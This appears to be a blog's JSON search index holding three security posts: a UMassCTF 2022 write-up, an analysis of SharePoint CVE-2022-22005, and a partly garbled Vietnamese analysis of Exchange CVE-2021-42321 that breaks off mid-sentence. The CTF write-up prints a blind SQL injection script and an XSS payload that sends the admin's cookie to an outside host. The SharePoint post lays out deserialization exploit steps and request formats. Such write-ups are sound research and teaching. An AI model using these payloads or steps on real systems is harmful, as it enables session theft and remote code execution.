[ { "title": "UMassCTF 2022", "url": "/posts/UMassCTF-2022/", "categories": "Writeups, UmassCTF 2022", "tags": "sqli, dom xss", "date": "2022-04-03 00:00:00 +0700", "snippet": "I haven‚Äôt released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something.VentingAfter tried web features, the proxy history showed me 1 interest endpoint.Just change admin=True and we will get admin login page. Trying put ‚Äò in an textbox give me that this is sql injection challenge.I tried dumped admin‚Äôs password by the following script and get the flag.import requestspasswd = &#39;&#39; for i in range(36): for x in range(127, 31, -1): c = chr(x) basepl = { &quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: &quot;1&#39; or (SELECT hex(substr(password,{},1)) FROM users WHERE+username=&#39;admin&#39;) &amp;gt; hex(&#39;{}&#39;) and &#39;a&#39;=&#39;a&quot;.format(i+1, c) } res = requests.post( &#39;http://34.148.103.218:4446/fff5bf676ba8796f0c51033403b35311/login&#39;, data=basepl, verify=False) # print(c+&#39; : &#39;+str(len(res.text))) if len(res.text) == 113: passwd += chr(x+1) break print(passwd)UmassdiningThe source code is given in the challenge‚Äôs description but I checked web features first. The web navigation shows us 3 options: Home, Register, Join. Register is basically for registration, after fill the form we got the message ‚ÄòWe got your request and will read it shortly!‚Äô. Join navigation is maybe administrator feature because the message ‚ÄòYou‚Äôre not allowed here!‚Äô appeared. Next we audit the source code. This web has the following 3 main endpoint@app.route(&quot;/register&quot;,methods = [&#39;GET&#39;,&#39;POST&#39;])def get_register(): if(request.method==&#39;GET&#39;): response = make_response(render_template(&#39;register.html&#39;)) add_resp_headers(response); if(check_for_cookie()==False): response.set_cookie(&quot;auth&quot;,&quot;-1&quot;,secure=True,samesite=None) return response elif(request.method==&#39;POST&#39;): if(active_count()&amp;lt;10): data = request.form.to_dict() thread = Thread(target=bot.checkEssay,kwargs={&#39;data&#39;:data}) thread.start() return &quot;We got your request and will read it shortly!&quot;,200 else: return &quot;We are busy right now, try again in a second&quot;,200@app.route(&quot;/review/essay&quot;,methods = [&#39;GET&#39;,&#39;POST&#39;])def reviewEssay(): essay = {&quot;email&quot;:request.args.get(&quot;name&quot;),&quot;essay&quot;:request.args.get(&quot;essay&quot;)} response = make_response(render_template(&#39;essay_checker.html&#39;,essay=essay)) add_resp_headers(response) if(request.remote_addr != &#39;127.0.0.1&#39;): return &quot;Sorry pal you\\&#39;re not admin&quot; try: return response except: return &#39;no essays to read&#39;,200@app.route(&quot;/join&quot;,methods = [&#39;GET&#39;])def get_play(): if(request.cookies.get(&quot;auth&quot;)==admin_cookie): return &quot;TEST{not_the_real_flag}&quot;,200 return &quot;You&#39;re not allowed here!&quot;,403Endpoint /join checks auth cookie and only returns flag if it is admin cookie. I need to get the admin token by somehow. /register forwards request data to bot.checkEssaydef checkEssay(data): opts = Options() opts.add_argument(&quot;--headless&quot;) driver = Firefox(executable_path=&#39;/usr/bin/geckodriver&#39;,options=opts) driver.set_window_size(320, 240) driver.set_page_load_timeout(5) driver.get(&#39;http://127.0.0.1:8000/&#39;) driver.add_cookie({&quot;name&quot;:&quot;auth&quot;,&quot;value&quot;:admin_cookie}) driver.get(&#39;http://127.0.0.1:8000/review/essay?email={a}&amp;amp;essay={b}&#39;.format(a=data[&#39;email&#39;],b=data[&#39;essay&#39;])) time.sleep(3) driver.quit()The above section takes data from register endpoint, add admin‚Äôs cookie to cookie and make request to the last of 3 endpoints - /review/essay, maybe i could leak the cookie from this. Look /review/essay handlerdef reviewEssay(): essay = {&quot;email&quot;:request.args.get(&quot;name&quot;),&quot;essay&quot;:request.args.get(&quot;essay&quot;)} response = make_response(render_template(&#39;essay_checker.html&#39;,essay=essay)) add_resp_headers(response) if(request.remote_addr != &#39;127.0.0.1&#39;): return &quot;Sorry pal you\\&#39;re not admin&quot; try: return response except: return &#39;no essays to read&#39;,200Check the essay_checker template returned by the above handler&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Essay Review&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;h1&amp;gt; Essay Review Panel &amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt; &amp;lt;div&amp;gt; &amp;lt;main&amp;gt; Essay&amp;lt;br&amp;gt; &amp;lt;br&amp;gt; Author&amp;lt;br&amp;gt; &amp;lt;br&amp;gt; &amp;lt;/main&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;The jinja2‚Äôs safe filter is used in essay property of essay object. The safe filter basically disables html-escape in the expression passed through it while rendering html page. It‚Äôs maybe vulnerable to XSS exploit and i can make outbound request to get admin‚Äôs cookie. I tried some basic payload but it didn‚Äôt work, my outbound server didn‚Äôt get any requests. The reason is the followingdef add_resp_headers(response): response.headers[&#39;Content-Security-Policy&#39;]= &quot;default-src &#39;self&#39;;script-src &#39;self&#39; &#39;unsafe-eval&#39;&quot;The above section adds CSP header to response that restrict browser can only load resource from the current origin. It literally means all directly payloads from our essay param won‚Äôt work. For more information about CSP, you can read here. I checked static folder and expected there was any usefull javascript file in it. And i saw things.jsvar iloveumass = document.getElementById(&quot;debug&quot;).getAttribute(&quot;data-iloveumass&quot;);function say_something(words){ setTimeout(`console.log(&#39;${words}&#39;)`,500)}document.addEventListener(&quot;DOMContentLoaded&quot;, function() { say_something(iloveumass)});This script gets the html element with id ‚Äòdebug‚Äô, takes ‚Äòdata-iloveumass‚Äô attribute from it and passes it to vulnerable setTimeout function call. We can manipulate this file to bypass CSP protection. Final payload is the following&amp;lt;script id=&#39;debug&#39; src=&quot;/static/js/thing.js&quot; data-iloveumass=&quot;aaa&#39;);eval(document.location=&#39;http://hoangnd.free.beeceptor.com?cookie=&#39;%2bdocument.cookie);console.log(&#39;aaa&quot;&amp;gt;&amp;lt;/script&amp;gt;Put it in essay in register form, and an request will be made to your server.Add admin‚Äôs cookie to /join endpoint and get flag." }, { "title": "CVE-2022-22005 Microsoft Sharepoint RCE", "url": "/posts/cve-2022-22005-microsoft-sharepoint-RCE/", "categories": "One-day analysis", "tags": "cve-2022-22005, microsoft sharepoint", "date": "2022-03-07 10:00:00 +0700", "snippet": "Vulnerability Analysis CVE-2022-22005Microsoft SharepointSharePoint is a platform for sharing and managing content, knowledge, and apps to support teamwork, quickly finding information, and collaborating seamlessly across the organization. More than 200,000 organizations and 190 million people use SharePoint for intranets, team sites, and content management. The number above is enough to see that this is always a big target for security researchers looking for vulnerabilities.With SharePoint, users can create an intranet (or intranet system) that works like any other website. In addition to a large site for the organization, sharepoint can divide small sub-sites for each group and internal department. Besides, this is a great content sharing management platform with customizable lists. Some types of list are built-in on Sharepoint such as list of images, documents, forms‚Ä¶ In addition to the built-in lists, users can install a new list and customize the properties of that list as they want. The powerful toolsets for customizing on Sharepoint are Sharepoint Designer and InfoPath Designer.CVE-2022-22005Microsoft‚Äôs February - 2022 patch fixes a vulnerability with code CVE-2022-22005. This vulnerability allows an attacker to execute code remotely and is scored 8.8 on the CVSSv3 calculator. Affected versions are listed below Microsoft SharePoint Server Subscription Edition Microsoft SharePoint Server 2019 Microsoft SharePoint Enterprise Server 2013 Service Pack 1 Microsoft SharePoint Enterprise Server 2016The analysis below was performed on Microsoft SharePoint Enterprise Server 2016.Patch analysisInstall patch January and February 2022 of Sharepoint 2016, gather Sharepoint dll files and decompile into source. Then add a few post-filter steps to remove unnecessary elements (comments, ‚Ä¶). Finally compare the two patches to find where the code is used by developers to patch. A deserialization patch location is found at Microsoft.Office.Server.Internal.Charting.UI.WebControls.ChartPreviewImage.loadChartImage()The patch uses a binder that limits what types are allowed to deserialize, which is what Microsoft used to do for bugs like this in the past. About the deserialize vulnerability you can learn more at here.Trace codeLearn a little bit about chart, this is a webpartpage - component of a page on Sharepoint. So it can be understood that in order for the data to go to the deserialize location, there must be a user account with permission to create page. Combining debugging and creating a page that uses the chart, the code is hit when the chart is loading data. Observe the function that causes the vulnerability, the deserialize data located in the buffer variable is set via the FetchBinaryData(sessionKey) function.// Microsoft.Office.Server.Internal.Charting.UI.WebControls.ChartPreviewImage.loadChartImage()private ChartImageSessionBlock loadChartImage(){ byte[] buffer = CustomSessionState.FetchBinaryData(this.sessionKey); ChartImageSessionBlock result = null; using ( MemoryStream memoryStream = new MemoryStream(buffer) ) { IFormatter formatter = new BinaryFormatter(); result = (ChartImageSessionBlock)formatter.Deserialize(memoryStream); } return result;}The code relates to session state in Sharepoint. This is a mechanism to store the state of an object in the sharepoint, that state can be a file, an image, ‚Ä¶ or specifically in this case a serialized ChartImageSessionBlock object. These states will be stored in the database as binary data and mapped to a session key. So to exploit this vulnerability we need to control the binary data in the database, then through the loadChartImage function to deserialize an arbitrary object. By using the Burp Suite tool during debugging we can get a request to trigger vulnerability.GET /_layouts/15/Chart/WebUI/Controls/ChartPreviewImage.aspx?sk=5264ebfb259840faa703bdbc976e069b_74929f85360d499d9f1d4f337bf49300&amp;amp;hash=2551012 HTTP/1.1Host: sharepoint2016:33257User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36Referer: http://sharepoint2016:33257/SitePages/testpage.aspxCookie: stsSyncAppName=Client; stsSyncIconPath=; WSS_FullScreenMode=falseConnection: Keep-AliveThe variable sk here is the sessionKey passed into the FetchBinaryData function, it has the form guid1_guid2 where guid1 is the id of the database and guid2 is the id of the ChartImageSessionBlock. To exploit the vulnerability, we will force guid2 to the id of another session state that contains the arbitrary binarydata. The next thing to do is figure out how to put arbitrary binary data into the session state table in the database.An article is published on the ZDI site about A previous vulnerability with code CVE-2021-27076 related to session state, using attachment mechanism on infopath form. When starting to create a new item in an infopath list, the item will be registered with a session key of itemId. Next, when attaching a file to this new item, that file will be saved as a binary data in the database with the key attachmentId.Arbitrary binary data is in the attachment file, and attachmentId is what we need to get to trigger the vulnerability. The problem is that when creating a new item in the infolist, only itemId will be returned in response. Through building the lab, found that the value of attachmentId is in the binarydata of the item, so we need to find a way to get attachmentId through itemId. The ZDI article also showed how to solve this problem, which is to replay itemId to FormServerAttachments.aspx, which will take the item‚Äôs binarydata and return it as a file.Here there are two directions to find the right request to FormServerAttachments.aspx, one is to try the functions, the other is to read the code and craft the request yourself. The first option will be better because it will save time and we will also get a right-format request. In case the function cannot be determined, it is mandatory to follow option 2 to read the code. Because the binary is returned as a file, the FileDownload function caught my eye.// Microsoft.Office.InfoPath.Server.Controls.FormServerAttachments.FileDownload(HttpContext) private static bool FileDownload(HttpContext context){ string text = context.Request.QueryString[&quot;fid&quot;]; string text2 = context.Request.QueryString[&quot;sid&quot;]; string value = context.Request.QueryString[&quot;key&quot;]; string strA = context.Request.QueryString[&quot;dl&quot;]; int num = 0; string empty = string.Empty; if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(value) || (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0 &amp;amp;&amp;amp; string.Compare(strA, &quot;ip&quot;, StringComparison.OrdinalIgnoreCase) != 0)) { ULS.SendTraceTag(1831874679U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Medium, &quot;Invalid request incorrect or missing query strings: {0}&quot;, new object[] { context.Request.Url.ToString() }); return false; } using (new GlobalStorageContext(text)) { try { SPSite spsite = SiteAndWebCache.Fetch().EnsureRequestSite(); Solution solutionById = SolutionCache.GetSolutionById(spsite, new SolutionIdentity(text2)); if (Canary.VerifyCanaryFromCookie(context, spsite, solutionById)) { context.Response.Clear(); context.Response.Cache.SetExpires(DateTime.Now.AddDays(2.0)); using (BinaryWriter binaryWriter = new BinaryWriter(context.Response.OutputStream)) { Base64DataStorage.Base64DataItem item = null; StreamUtils.DeserializeObjectsFromString(value, delegate (EnhancedBinaryReader binaryReader) { item = new Base64DataStorage.Base64DataItem(binaryReader); DocumentChildState.StateInfo stateInfo = new DocumentChildState.StateInfo(); ((IBinaryDeserializable)stateInfo).Deserialize(binaryReader); StateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey); item.EnsureData(stateKey); }); byte[] dataAsBytes = item.GetDataAsBytes(); using (Stream stream = new MemoryStream(dataAsBytes, false)) { if (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0) { context.Response.AppendHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\\&quot;image\\&quot;&quot;); context.Response.AppendHeader(&quot;X-Download-Options&quot;, &quot;noopen&quot;); context.Response.ContentType = ImageUtils.GetContentType(dataAsBytes); return InlinePicture.ReadInfoFromStream(binaryWriter, stream); } context.Response.ContentType = &quot;application/octet-stream&quot;; if (FileAttachment.ReadInfoFromStream(binaryWriter, out num, out empty, stream)) { FilePathUtils.AddFileDownloadHttpHeader(context, empty); return true; } return false; } } } ULS.SendTraceTag(1831874680U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Verbose, &quot;Can&#39;t verify canary from cookie for FileDownload&quot;); return false; } catch (InfoPathException) { ULS.SendTraceTag(1831874681U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Medium, &quot;InfoPathException occurred downloading fileattachment or inline picture&quot;); } } return false;}Luckily the variables required for request are pretty obvious - fid, sid, key, dl. Let‚Äôs dive a little deeper into the components, the following code is the error return condition// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strAif (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(value) || (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0 &amp;amp;&amp;amp; string.Compare(strA, &quot;ip&quot;, StringComparison.OrdinalIgnoreCase) != 0))So the required params must be non-empty, where dl must be either the string ‚Äòfa‚Äô or ‚Äòip‚Äô.// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strASPSite spsite = SiteAndWebCache.Fetch().EnsureRequestSite();Solution solutionById = SolutionCache.GetSolutionById(spsite, new SolutionIdentity(text2));if (Canary.VerifyCanaryFromCookie(context, spsite, solutionById)){ ...}This code gets the solutionId from sid and authenticate it with the infopath canary inside the cookie, for example a cookie like this:_InfoPath_CanaryValueAGQX2G3RUCCXQRUNZHR3UB7IIEMSOL2MNFZXI4ZPORSXG5C7NFXGM327NRUXG5BPJF2GK3JPORSW24DMMF2GKLTYONXCWMKZLBZTE4TDI5WXC4ZSIIZGIUTINE4EI6DBGFWVKNKDLFZGSTJYLFNHE33VMJ5EGSLEOM=KBxeU4WXMZ3Yg8v0ZPZfAWcpoiLL/R3sfejthMFTfL1x9GqMoiIOMSS9XrT0gguJmdn0Yj2qw0gqlDJXT7X49A==|637806206864107501This cookie has a key in the format ‚Äò_InfoPath_CanaryValue‚Äô+ suffix. The suffix is sid to look for. Next is the code that gets the binary data from the session key.// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strABase64DataStorage.Base64DataItem item = null;StreamUtils.DeserializeObjectsFromString(value, delegate (EnhancedBinaryReader binaryReader){ item = new Base64DataStorage.Base64DataItem(binaryReader); DocumentChildState.StateInfo stateInfo = new DocumentChildState.StateInfo(); ((IBinaryDeserializable)stateInfo).Deserialize(binaryReader); StateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey); item.EnsureData(stateKey);});byte[] dataAsBytes = item.GetDataAsBytes();The session state key will be retrieved from the key variable, let‚Äôs see the details of the DeserializeObjectsFromString function// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strAinternal static void DeserializeObjectsFromString(string value, Action&amp;lt;EnhancedBinaryReader&amp;gt; readerMethod){ using (Base64Stream base64Stream = new Base64Stream(value)) { using (EnhancedBinaryReader enhancedBinaryReader = new EnhancedBinaryReader(base64Stream)) { readerMethod(enhancedBinaryReader); } }}So key needs to be in base64 format, see Base64DataStorage.Base64DataItem(binaryReader) function.// Microsoft.Office.InfoPath.Server.SolutionLifetime.Base64DataStorage.Base64DataItem.Base64DataItem(EnhancedBinaryReader)internal Base64DataItem(EnhancedBinaryReader reader){ this._state = (Base64ItemState)reader.ReadCompressedInt(); this._sessionDataType = (Base64DataStorage.Base64DataItem.DataTypeInSessionState)reader.ReadCompressedInt(); this._itemId = new Base64SerializationId(reader);}So the first 3 positions in the key‚Äôs structure will be base64ItemState (int) dataTypeInSessionState (int) base64SerializationId (guid string)let‚Äôs see the function DocumentChildState.StateInfo.Deserialize(binaryReader)// DocumentChildState.StateInfo.Deserialize(binaryReader)void IBinaryDeserializable.Deserialize(EnhancedBinaryReader reader){ this._serializedKey = reader.ReadString(); this._size = reader.ReadCompressedInt(); this._version = reader.ReadCompressedInt();}so the next 3 positions in the key‚Äôs structure will be serializedKey (string) size (int) version (int)Next let‚Äôs consider which components will require correct value. The part to get the session state key is as followsStateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey);item.EnsureData(stateKey);So the serializedKey has the form guid1_guid2, where guid1 is the database id and guid2 is the itemId we put in, next see the item.EnsureData(stateKey) function// Microsoft.Office.InfoPath.Server.SolutionLifetime.Base64DataStorage.Base64DataItem.EnsureData(StateKey)internal void EnsureData(StateKey stateKey){ if (this.State == Base64ItemState.DelayLoad) { byte[] sessionData = StateManager.GetManager(HttpContext.Current).PeekState(stateKey); // get binary data from stateKey this.SetSessionData(sessionData); return; } if (this.State == Base64ItemState.Removed) { throw new InfoPathLocalizedException(InfoPathResourceManager.Ids.ServerGenericError, new string[0]); }}The first condition must be met to get binarydata from the database, so base64ItemState must have the value of enum Base64ItemState.DelayLoad, see inside Base64ItemStateinternal enum Base64ItemState{ NoChange, Updated, Removed, New, DelayLoad // 4}From there base64ItemState has to be 4. Next look at the enum values of dataTypeInSessionStateprivate enum DataTypeInSessionState{ Unknown, Utf8String, ByteArray // 2}The data we need is stored in the session state table as binary data, so the value of dataTypeInSessionState has to be 2. In summary, key has the following structure.After getting the binarydata, here is the code returns it as a fileusing (Stream stream = new MemoryStream(dataAsBytes, false)){ if (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0) { context.Response.AppendHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\\&quot;image\\&quot;&quot;); context.Response.AppendHeader(&quot;X-Download-Options&quot;, &quot;noopen&quot;); context.Response.ContentType = ImageUtils.GetContentType(dataAsBytes); return InlinePicture.ReadInfoFromStream(binaryWriter, stream); } context.Response.ContentType = &quot;application/octet-stream&quot;; if (FileAttachment.ReadInfoFromStream(binaryWriter, out num, out empty, stream)) { FilePathUtils.AddFileDownloadHttpHeader(context, empty); return true; } return false;}so dl must have the value ‚Äòip‚Äô. The variables sent to FormServerAttachments.aspx have the following formExploit stepsAfter detailed analysis, the exploit steps are summarized as follows: Create an infopath list on the site. Open the form to create a new item on the list, save the itemId from the response. Attachment file contains the payload on that item, but don‚Äôt press save so that the session state can be kept in the database. Put the itemId information obtained from step 2 into the request sent to FormServerAttachments.aspx, save the attachmentId information from the response. Include attachmentId in the request to trigger deserialize in ChartPreviewImage.PermissionBy default, a normal account has permission to create sub-sites and that account will have full permissions on the new site. Therefore, we only need an account with default permissions to exploit the vulnerability.Proof of Concepthttps://youtu.be/1Ckjh-uuNu4REFERENCEShttps://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint" }, { "title": "CVE-2021-42321 Microsoft Exchange RCE", "url": "/posts/CVE-2021-42321-Microsoft-Exchange-RCE/", "categories": "One-day analysis", "tags": "cve-2021-42321, microsoft exchange", "date": "2021-11-20 15:00:00 +0700", "snippet": "·ªû b·∫£n v√° th√°ng 11 c·ªßa Exchange, m·ªôt l·ªó h·ªïng c√≥ m√£ CVE-2021-42321 ƒë∆∞·ª£c Microsoft t·ª©c t·ªëc c·∫£nh b√°o ng∆∞·ªùi d√πng ph·∫£i nhanh ch√≥ng c·∫≠p nh·∫≠t b·∫£n v√° ƒë·ªÉ tr√°nh b·ªã khai th√°c. B√†i PoC chi ti·∫øt v·ªÅ qu√° tr√¨nh diff code v√† ph√¢n t√≠ch ƒë√£ c√≥ Blog c·ªßa NCSC, ·ªü ƒë√¢y m√¨nh ch·ªâ n√™u th√™m m·ªôt s·ªë l∆∞u √Ω v√† b∆∞·ªõc cu·ªëi trong qu√° tr√¨nh exploit.Exchange Web Service (EWS)Ngo√†i hai endpoint ch√≠nh l√† /ecp v√† /owa ƒë·ªÉ qu·∫£n l√Ω c·∫•u h√¨nh v√† h·ªôp th∆∞, Exchange c√≤n c√≥ /ews cho webservice.EWS cung c·∫•p cho ng∆∞·ªùi d√πng kh·∫£ nƒÉng giao ti·∫øp v·ªõi m√°y ch·ªß Exchange th√¥ng qua c√°c SOAP request, ƒë·ªìng nghƒ©a v·ªõi vi·ªác request v√† response ƒë∆∞·ª£c bi·ªÉu di·ªÖn d∆∞·ªõi d·∫°ng XML. Template XML ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a t·ª´ c√°c file schema v√† wsdl tr√™n virtual directory c·ªßa m√°y ch·ªß Exchange. C√°c t·ªáp n√†y c√≥ th·ªÉ truy c·∫≠p b·∫±ng browser qua c√°c Url d∆∞·ªõi ƒë√¢y. http://[yourclientaccessserver].com/ews/services.wsdl ‚Äî The location of the WSDL file. http://[yourclientaccessserver].com/ews/messages.xsd ‚Äî The location of the messages schema. http://[yourclientaccessserver].com/ews/types.xsd ‚Äî The location of the types schema.Endpoint ƒë·ªÉ giao ti·∫øp v·ªõi m√°y ch·ªß Exchange m·∫∑c ƒë·ªãnh l√† /EWS/Exchange.asmx tuy nhi√™n tr√™n m√¥i tr∆∞·ªùng product n√™n s·ª≠ d·ª•ng Autodiscover ƒë·ªÉ x√°c ƒë·ªãnh url c·ªßa ews ch√≠nh x√°c.User configurationNh∆∞ ·ªü b√†i blog c·ªßa NCSC, h√†m g√¢y ra l·ªói l√† h√†m TryDeserialize c·ªßa l·ªõp Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializerƒê·∫∑t debug ·ªü h√†m g√¢y l·ªói, s·ª≠ d·ª•ng ch·ª©c nƒÉng tr√™n trang add-ins ·ªü /ecp ƒë·ªÉ quan s√°t bi·∫øn userConfigurationQuan s√°t th·∫•y userConfiguration c√≥ thu·ªôc t√≠nh ConfigurationName l√† ExtensionMasterTable v√† c√≥ d·∫°ng dictionary ch·ª©a 3 thu·ªôc t√≠nh OrgDO, OrgExtV, OrgChkTm. ƒê·ªÉ h√†m nh·∫£y v√†o ƒë∆∞·ª£c ƒëo·∫°n deserialize th√¨ tham s·ªë OrgDO c·ªßa bi·∫øn userConfiguration ph·∫£i c√≥ gi√° tr·ªã l√† false, m·∫∑c ƒë·ªãnh gi√° tr·ªã hi·ªán t·∫°i ƒëang l√† true.Sau ƒë·∫•y c·∫ßn ti·∫øp t·ª•c t√¨m ki·∫øm c√°ch update user configuration, ƒëo·∫°n n√†y ·ªü trang doc c·ªßa Microsoft ƒë√£ m√¥ t·∫£ c·ª±c k·ª≥ chi ti·∫øt. ·ªû t√†i li·ªáu nh·∫Øc ƒë·∫øn ·ªü tr√™n h·ªç c≈©ng ƒë√£ cho m√¨nh m·ªôt v√≠ d·ª• ho√†n ch·ªânh v·ªÅ SOAP request, c√πng ng√≥ qua m·ªôt ch√∫t&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:m=&quot;https://schemas.microsoft.com/exchange/services/2006/messages&quot; xmlns:t=&quot;https://schemas.microsoft.com/exchange/services/2006/types&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&amp;gt; &amp;lt;soap:Header&amp;gt; &amp;lt;t:RequestServerVersion Version=&quot;Exchange2010&quot; /&amp;gt; &amp;lt;/soap:Header&amp;gt; &amp;lt;soap:Body&amp;gt; &amp;lt;m:UpdateUserConfiguration&amp;gt; &amp;lt;m:UserConfiguration&amp;gt; &amp;lt;t:UserConfigurationName Name=&quot;TestConfig&quot;&amp;gt; &amp;lt;t:DistinguishedFolderId Id=&quot;drafts&quot;/&amp;gt; &amp;lt;/t:UserConfigurationName&amp;gt; &amp;lt;t:Dictionary&amp;gt; &amp;lt;t:DictionaryEntry&amp;gt; &amp;lt;t:DictionaryKey&amp;gt; &amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt; &amp;lt;t:Value&amp;gt;PhoneNumber&amp;lt;/t:Value&amp;gt; &amp;lt;/t:DictionaryKey&amp;gt; &amp;lt;t:DictionaryValue&amp;gt; &amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt; &amp;lt;t:Value&amp;gt;111-111-5555&amp;lt;/t:Value&amp;gt; &amp;lt;/t:DictionaryValue&amp;gt; &amp;lt;/t:DictionaryEntry&amp;gt; &amp;lt;/t:Dictionary&amp;gt; &amp;lt;/m:UserConfiguration&amp;gt; &amp;lt;/m:UpdateUserConfiguration&amp;gt; &amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;T·ª´ v√≠ d·ª• n√†y c√≥ th·ªÉ th·∫•y m·ªôt user configuration s·∫Ω c√≥ c√°c th√†nh ph·∫ßn b·∫Øt bu·ªôc l√† Name c√πng FolderId, b√™n d∆∞·ªõi l√† c√°c DictionaryEntry, c·∫•u tr√∫c n√†y kh·ªõp v·ªõi bi·∫øn userConfiguration m√¨nh ƒë√£ quan s√°t ·ªü tr√™n. Nh∆∞ v·∫≠y m√¨nh ƒë√£ bi·∫øt c√°c th√†nh ph·∫ßn l√† Name v√† DictionaryEntry, ph·∫£i c√≥ th√™m FolderId m·ªõi c√≥ th·ªÉ update ƒë∆∞·ª£c config ExtensionMasterTable. ExtensionMasterTable l√† m·ªôt config c√≥ s·∫µn tr√™n Exchange, v·∫≠y kh·∫£ nƒÉng folder c·ªßa n√≥ c≈©ng ƒë√¢u ƒë√≥ trong s·ªë nh·ªØng th·∫±ng c√≥ s·∫µn. M√¨nh th·ª≠ g·ª≠i b·ª´a m·ªôt get request ƒë·ªÉ l·∫•y th√¥ng tin c·ªßa ExtensionMasterTableError 500 üôÑüôÑüôÑüôÑüôÑüôÑ. ƒê·∫øn ƒë√¢y th√¨ m√¨nh ƒë√£ th·ª≠ 7 7 49 chi√™u nh∆∞ng response v·∫´n lu√¥n l√† 500, k hi·ªÉu ki·ªÉu g√¨ khi request ƒë∆∞·ª£c l·∫•y t·ª´ ch√≠nh doc. May m·∫Øn c√≥ ng∆∞·ªùi anh t·ª´ng pwn2own Exchange v·∫´n c√≤n gi·ªØ l·∫°i 1 request h·ªìi ƒë·∫•y v√† g·ª≠i cho m√¨nh test th·ª≠. It worked! but why? Sau khi h·∫øt soi n·ªïi b·∫±ng m·∫Øt th∆∞·ªùng th√¨ m√¨nh quy·∫øt ƒë·ªãnh d√πng Winmerge ƒë·ªÉ so s√°nh hai th·∫±ng v·ªõi nhau, ƒë√∫ng ra n√™n d√πng s·ªõm h∆°n üòÉ.S·ª≠ng s·ªët kh√¥ng h·ªÅ nh·∫π khi nh·∫≠n ra kh√°c bi·ªát g√¢y ra l·ªói 500 l√† ch·ªó khai b√°o namespace, trang doc l·∫°i s·ª≠ d·ª•ng https thay v√¨ http. ü§ê C·∫°n l·ªùi ‚Ä¶Tr·ªü l·∫°i v·ªõi v·∫•n ƒë·ªÅ x√°c ƒë·ªãnh FolderId, sau khi ƒë√£ gi·∫£i quy·∫øt l·ªói 500, test th·ª≠ m·ªôt s·ªë folder c√≥ s·∫µn, ngay th·∫±ng ƒë·∫ßu ti√™n ƒë√£ d√≠nhNgo√†i vi·ªác x√°c ƒë·ªãnh ƒë∆∞·ª£c FolderId c·ªßa ExtensionMasterTable l√† inbox, m√¨nh c√≤n c√≥ ƒë∆∞·ª£c c·∫•u tr√∫c c·ªßa n√≥ ƒë·ªÉ ƒë∆∞a v√†o request update (ƒë·ªÉ ƒë·∫£m b·∫£o kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨ m√¨nh th∆∞·ªùng get tr∆∞·ªõc sau ƒë√≥ s·ª≠a th√¥ng tin ƒë·ªÉ ƒë∆∞a v√†o update). Update th·ª≠ ExtensionMasterTable v√† ki·ªÉm tra l·∫°i b·∫±ng get request·ªîn r·ªìi, debug l·∫°i th·ª≠ th√¥i. S·ª≠ng s·ªët again khi v·∫´n kh√¥ng th·ªÉ nh·∫£y v√†o ƒëo·∫°n code deserialize. Sau ƒë√≥ m√¨nh ph√°t hi·ªán ra vi·ªác s·ª≠ d·ª•ng ch·ª©c nƒÉng tr√™n trang add-ins s·∫Ω ƒë∆∞a ExtensionMasterTable s·∫Ω b·ªã ƒë∆∞a tr·ªü l·∫°i v·ªÅ gi√° tr·ªã m·∫∑c ƒë·ªãnh (OrgDO=true) khi·∫øn vi·ªác update config c·ªßa m√¨nh ƒë·∫øn ƒë√¢y tr·ªü n√™n v√¥ nghƒ©a. Nghƒ© ƒë·∫øn chuy·ªán ph·∫£i trace code v√†o s√¢u h∆°n ƒë·ªÉ x√°c ƒë·ªãnh ch·ªó ƒë∆∞a config tr·ªü v·ªÅ m·∫∑c ƒë·ªãnh l√† tr·∫ßm c·∫£m, th√¥i th√¨ m√¨nh th·ª≠ fuzz ch·ª©c nƒÉng tr∆∞·ªõc, c√≥ th·ªÉ ch·ª©c nƒÉng n√†o ƒë·∫•y s·∫Ω kh√¥ng reset config, ai bi·∫øt ƒë∆∞·ª£c ü§∑. Cu·ªëi c√πng m√¨nh ph√°t hi·ªán ra 